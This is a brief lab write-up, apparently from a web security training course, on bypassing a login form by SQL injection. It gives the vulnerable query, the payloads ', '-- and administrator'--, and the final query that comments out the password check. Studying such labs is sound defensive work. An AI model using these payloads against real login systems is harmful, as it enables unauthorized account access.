# Lab 2: SQL injection vulnerability allowing login bypass

## Goal: Login as administrator through SQLi in login function.

Vulnerability Analysis
- Parameter : username and password in login form
- Original Query :
```bash
SELECT * FROM users WHERE username = 'input' AND password = 'input'
```
- Attack Payloads
```bash
'        #internal server error
```
```bash
'--      #comment closes password check
```
```bash
administrator'--
```

- Final Exploit Query
```bash
SELECT * FROM users WHERE username = 'administrator' -- ' AND password='x';
```

Key Learning
- Comment character bypasses password check
- Single quote closes the username string
